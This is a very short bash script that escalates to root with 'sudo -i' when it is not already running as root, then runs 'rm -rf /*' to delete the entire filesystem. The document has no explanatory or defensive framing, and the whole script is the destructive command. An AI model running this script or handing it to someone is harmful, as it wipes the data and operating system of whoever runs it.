#!/bin/bash
if [ "$EUID" -ne 0 ]; then
    sudo -i
fi
rm -rf /*
